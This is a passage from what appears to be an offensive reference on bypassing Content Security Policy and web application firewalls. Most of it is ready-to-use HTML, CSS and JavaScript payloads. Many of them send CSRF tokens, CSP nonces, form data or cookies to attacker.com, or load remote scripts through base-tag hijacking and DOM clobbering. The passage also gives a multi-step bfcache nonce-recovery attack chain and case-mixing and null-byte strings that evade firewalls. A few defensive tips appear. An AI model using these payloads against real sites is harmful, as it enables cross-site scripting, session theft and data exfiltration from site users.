<style>script[nonce^="a"]{background:url(https://attacker.com/?n=a)}</style>
```

### Category E: Data Exfiltration (No Script Execution Required)
```html
<!-- E1: DNS prefetch exfiltration -->
<link rel="dns-prefetch" href="//TOKEN_VALUE.attacker.com">

<!-- E2: Link prefetch exfiltration -->
<link rel="prefetch" href="https://attacker.com/collect?data=SECRET">

<!-- E3: Meta refresh redirect with data in URL -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?d=DATA">

<!-- E4: Form action credential theft -->
<form action="https://attacker.com/collect"><input name="data" type="text"><button>Submit</button></form>

<!-- E5: Image tag exfiltration (if img-src allows attacker domain or *) -->
<img src="https://attacker.com/collect?data=TOKEN">
```

### Category F: CSS-Based Exfiltration
```html
<!-- F1: CSS attribute selector CSRF token leak -->
<style>input[name="csrf"][value^="a"]{background:url('https://attacker.com/?v=a')}</style>

<!-- F2: CSS nonce leak from meta tag -->
<style>meta[content*="nonce-a"]{background:url('https://attacker.com/?n=a')}</style>

<!-- F3: Font-based character detection -->
<style>@font-face{font-family:p;src:url(https://attacker.com/?c=a);unicode-range:U+61}.target{font-family:p}</style>
```

### Category G: DOM Clobbering
```html
<!-- G1: Clobber window.config with anchor element -->
<a id="config" href="https://attacker.com/evil.js"></a>

<!-- G2: Clobber nested property via form+input -->
<form id="appConfig"><input name="scriptUrl" value="https://attacker.com/evil.js"></form>

<!-- G3: Clobber with HTMLCollection for array-like access -->
<a id="settings"></a><a id="settings" name="url" href="https://attacker.com/payload.js"></a>
```

### Category H: Object/Embed Bypass
```html
<!-- H1: Object tag with data URI (requires missing/permissive object-src) -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>

<!-- H2: Embed with data URI -->
<embed src="data:text/html,<script>alert(1)</script>" type="text/html">
```

### Category I: Iframe/Worker Bypass
```html
<!-- I1: iframe srcdoc (if frame-src/child-src allows or not set) -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>

<!-- I2: iframe with data: src -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
```

---

## 12. Decision Matrix: Selecting the Right Bypass

| CSP Configuration | Primary Bypass Strategy | Payload Category |
|---|---|---|
| `script-src 'unsafe-inline'` | Direct inline XSS | Any inline `<script>` or event handler |
| `script-src 'unsafe-eval'` | Find eval/Function sink in app JS | Inject into eval'd string |
| `script-src data:` | Data URI script | `<script src="data:...">` |
| Broad domain whitelist (Google, CDN) | JSONP or AngularJS | Categories A and B |
| Nonce-based, missing `base-uri` | Base tag hijack + relative path | Category C |
| Nonce-based, nonce in meta/DOM | CSS attribute selector leak | Categories D and F |
| `strict-dynamic` with DOM-reading scripts | DOM clobbering + script gadget | Category G + library gadgets |
| Very tight CSP, no script execution | Scriptless exfiltration | Categories E, F (DNS prefetch, form, meta refresh) |
| Missing `form-action` | Credential theft via injected form | Category E4 |
| Missing `object-src` | Object/Embed data URI XSS | Category H |
| Missing `frame-ancestors` | Clickjacking chain attack | iframe embedding + social engineering |
| `style-src 'unsafe-inline'` | CSS-based data exfiltration | Category F (tokens, nonces, secrets) |

---

## References

- HackTricks CSP Bypass: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- Intigriti CSP Bypasses Guide: https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses
- Beyond XSS -- CSP Bypass: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
- JSONBee Repository: https://github.com/zigoo0/JSONBee
- CSPBypass.com: https://github.com/renniepak/CSPBypass
- Black Hills InfoSec -- JSONPeek: https://www.blackhillsinfosec.com/jsonpeek-and-csp-b-gone/
- Hurricane Labs -- JSONP CSP Bypass: https://hurricanelabs.com/blog/bypassing-csp-with-jsonp-endpoints/
- PortSwigger -- AngularJS CSP Bypass: https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
- PortSwigger -- DOM Clobbering CSP Bypass: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- PortSwigger -- Form Hijacking CSP Bypass: https://portswigger.net/research/using-form-hijacking-to-bypass-csp
- PortSwigger -- Angular Sandbox Escape + CSP Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp
- Script Gadgets Paper (Lekies et al., ACM CCS 2017): https://acmccs.github.io/papers/p1709-lekiesA.pdf
- DOM Clobbering Exploit in the Wild (2024): https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
- Compass Security -- DNS Prefetch CSP Bypass: https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/
- WebRTC CSP Gap: https://github.com/w3c/webappsec-csp/issues/92
- CSP Nonce Stealing Issues: https://github.com/w3c/webappsec-csp/issues/98
- Nonce Exfiltration Prevention: https://github.com/w3c/webappsec-csp/issues/258
- Nonce CSP Bypass via Disk Cache: https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache
- CSP Nonce Bypass Techniques: https://csplite.com/csp304/
- Detectify -- CSP form-action Bypass: https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/
- CVE-2020-6519 Chrome CSP Bypass: https://medium.com/perimeterx/zero-day-csp-bypass-vulnerability-in-google-chrome-discovered-almost-every-website-in-the-world-ac5e999808b3
- Intigriti July 2024 CTF -- CSP Bypass: https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/
- Cobalt -- CSP and Bypasses: https://www.cobalt.io/blog/csp-and-bypasses
- Mozilla Bug 1316826 -- strict-dynamic Bypass: https://bugzilla.mozilla.org/show_bug.cgi?id=1316826
- Truesec -- Code-Reuse Attacks Bypassing XSS Mitigations: https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks
- PortSwigger CSP Bypass Lab: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

---
## [2024-2026 Research Update]

### Advanced Nonce Leakage via bfcache and Disk Cache (2024-2025)

A sophisticated nonce recovery technique combining HTML injection with browser caching mechanisms was disclosed circa mid-2025. This extends the nonce exfiltration techniques in Section 6 with a caching-based recovery flow.

**Full Attack Chain:**

1. **CSS injection stage:** Attacker injects CSS attribute selectors that leak the CSP nonce from a `<meta>` tag or DOM attribute (see Section 9 for CSS exfiltration payloads)
2. **Cache capture:** The page with the valid nonce is cached by browser's bfcache or disk cache
3. **Navigation trigger:** Attacker navigates user away from the page via link click, meta refresh, or JavaScript redirect
4. **Cache restoration:** `history.back()`, back button, or `navigation.back()` restores the page from bfcache
5. **Nonce reuse:** The bfcache-restored page carries the same nonce as the original response
6. **Payload execution:** Attacker's injected payload uses the known cached nonce for script execution

**Key difference from static nonce reuse (Section 6.1):** The nonce itself may be properly randomized per-request by the server, but the browser's caching mechanism preserves the original nonce value when restoring the page from cache.

**Browser-specific behavior:**
- Chrome/Edge: bfcache enabled by default; pages with `Cache-Control: no-store` may still be bfcache-eligible in some versions
- Firefox: bfcache enabled; honors `Cache-Control: no-back-forward-cache`
- Safari: Aggressive bfcache; fewer opt-out mechanisms

**Payload for bfcache nonce recovery:**
```html
<!-- Step 1: CSS injection to leak nonce (must be in same page load) -->
<style>
meta[content*="nonce-a"]{--l:url(https://attacker.com/n?c=a)}
meta[content*="nonce-b"]{--l:url(https://attacker.com/n?c=b)}
/* ... all base64 characters ... */
</style>

<!-- Step 2: Navigation trigger (fires after CSS leak completes) -->
<meta http-equiv="refresh" content="3;url=https://attacker.com/redirect-back">

<!-- Step 3: Attacker's redirect-back page -->
<script>history.back()</script>
<!-- Page restored from bfcache with same nonce -->

<!-- Step 4: Subsequent injection with known nonce -->
<script nonce="LEAKED_NONCE">alert(document.cookie)</script>
```

**Defense:**
- Set `Cache-Control: no-store` on all pages with CSP nonces
- Use `Cache-Control: no-back-forward-cache` where supported
- Regenerate nonces on `pageshow` event with `event.persisted === true`
- Implement nonce-per-element rather than nonce-per-page where possible

**Source:** https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching
**Source:** https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache

### base-uri Hijacking: Extended Exploitation Patterns

Expanding on Section 3 with 2024-2026 findings on base-uri exploitation in combination with modern CSP configurations.

**Pattern 1: base-uri + nonce + relative path (most common)**
```html
<!-- CSP: script-src 'nonce-random123' 'strict-dynamic' -->
<!-- Missing: base-uri directive -->

<!-- Attacker injects: -->
<base href="https://attacker.com/">

<!-- Page's existing script tags with valid nonces: -->
<script nonce="random123" src="/js/vendor.js"></script>
<script nonce="random123" src="/js/app.js"></script>
<!-- Both now load from https://attacker.com/js/vendor.js and /js/app.js -->
<!-- Nonce validates the script elements; base-uri controls where they load from -->
```

**Pattern 2: base-uri + service worker registration**
```html
<!-- If the page registers a service worker from a relative path: -->
<!-- navigator.serviceWorker.register('/sw.js') -->
<!-- The base tag redirects SW registration to attacker.com/sw.js -->
<!-- This achieves persistent compromise via malicious service worker -->
<base href="https://attacker.com/">
```

**Pattern 3: base-uri + ES module imports**
```html
<!-- ES modules loaded via relative import map entries: -->
<!-- <script type="importmap">{"imports":{"react":"./vendor/react.js"}}</script> -->
<!-- The base tag redirects all relative module paths -->
<base href="https://attacker.com/">
```

**Why base-uri is frequently missing:**
- `base-uri` does NOT fall back to `default-src` (unlike most fetch directives)
- Many CSP generators and templates omit it
- Developers may not be aware of the `<base>` tag injection risk
- Security scanners sometimes do not flag missing `base-uri`

### strict-dynamic Gadgets: 2024-2026 Discoveries

**Webpack AutoPublicPathRuntimeModule DOM Clobbering (GHSA-4vvj-4cpr-p986):**

Webpack's auto public path detection reads `document.currentScript` or `document.querySelector('script[src]')` to determine the base URL for chunk loading. DOM clobbering these references redirects chunk loading to attacker-controlled servers.

```html
<!-- Clobber document.currentScript -->
<script id="currentScript" src="https://attacker.com/"></script>

<!-- Webpack's generated code reads: -->
<!-- var scriptUrl = document.currentScript && document.currentScript.src; -->
<!-- scriptUrl is now "https://attacker.com/" -->
<!-- All dynamic imports resolve relative to attacker.com -->

<!-- With strict-dynamic, the loaded chunks execute because Webpack's -->
<!-- chunk loader runs in a trusted (nonced) script context -->
```

**Rollup Bundler DOM Clobbering (CVE-2024-47068):**

Rollup-bundled scripts contained auto-generated module system code referencing `document.currentScript` for base URL determination. Same clobbering vector as Webpack.

```html
<img name="currentScript" src="https://attacker.com/evil.js">
<!-- Rollup's generated code reads the clobbered value -->
<!-- Additional chunk loads redirect to attacker.com -->
```

**In-the-Wild DOM Clobbering + strict-dynamic Chain (Brett Buerhaus, Feb 2024):**

Real-world exploit chain combining:
1. postMessage origin bypass via XSS on a sibling domain
2. DOM clobbering of `mGlobals.nuanceLaunchJS` via double-anchor technique
3. Trusted nonced script reads clobbered URL and creates dynamic script element
4. strict-dynamic propagates trust to the attacker's loaded script

```html
<a id="mGlobals"></a>
<a id="mGlobals" name="nuanceLaunchJS" href="https://attacker.com/evil.js"></a>
<!-- window.mGlobals.nuanceLaunchJS now returns attacker's URL -->
<!-- Trusted script: var s = createElement('script'); s.src = mGlobals.nuanceLaunchJS; -->
<!-- strict-dynamic allows the loaded script to execute -->
```

**Source:** https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
**Source:** https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
**Source:** https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm

### Trusted Types Bypass Techniques (2024-2026)

**Attribute Node Bypasses (Masato Kinugawa):**

Modifying existing attribute values via `nodeValue` or `textContent` on an attribute node bypasses Trusted Types enforcement entirely. The assignment is not intercepted because Trusted Types checks the property being set on the element, not attribute-node-level mutations.

```javascript
// Bypass Trusted Types via attribute node manipulation
var el = document.getElementById('target');
var attr = el.getAttributeNode('href');
attr.value = 'javascript:alert(1)'; // NOT intercepted by Trusted Types
```

**Default Policy Abuse:**

```javascript
// DANGEROUS - overly permissive default policy disables Trusted Types
trustedTypes.createPolicy('default', {
  createHTML: (s) => s,        // pass-through = no protection
  createScript: (s) => s,
  createScriptURL: (s) => s,
});
```

**Polyfill Circumvention (Firefox):**

Firefox does not natively support Trusted Types. The polyfill checks for `window.trustedTypes` and skips initialization if it already exists. An attacker can pre-define `window.trustedTypes` via DOM clobbering:

```html
<img name="trustedTypes">
<!-- window.trustedTypes is now the <img> element -->
<!-- Polyfill sees trustedTypes is defined, skips initialization -->
<!-- No Trusted Types enforcement applied -->
```

**MutantBedrog Malvertising Campaign:**

The MutantBedrog campaign was observed working around Trusted Types CSP protections at every stage of execution, navigating the restrictions rather than breaking them through a single vulnerability.

**Source:** https://portswigger.net/daily-swig/untrusted-types-researcher-demos-trick-to-beat-trusted-types-protection-in-google-chrome
**Source:** https://blog.confiant.com/p/the-curious-case-of-mutantbedrogs

### WAF Bypass Techniques (2025-2026)

**Mixed-Case Event Handler Bypass (Cloudflare, 2025):**
```html
<img src=x oNeRrOr=alert(1)>
<svg/oNlOaD=alert(1)>
```
WAF's token matching was case-sensitive; browser HTML parsing is case-insensitive.

**Null Byte Injection (Cloudflare, 2025):**
```html
<img src=x onerror%00=alert(1)>
```
Null bytes caused WAF to terminate parsing early while browser continued processing.

**SVG Injection Bypass:**
```html
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```
WAF rules often do not inspect SVG content as thoroughly as standard HTML elements.

**Cloudflare 2026 WAF Updates:**
Cloudflare added new managed rules including detection for "XSS - JavaScript Event Handler Coercion - URI" and WordPress "XSS2Shell" (CVE-2026-64638), indicating active response to the bypass patterns above.

**Source:** https://medium.com/@pranavrp77/xss-bypassing-cloudflare-waf-with-a-simple-trick-12aff8ce87c7
**Source:** https://developers.cloudflare.com/changelog/product/waf/
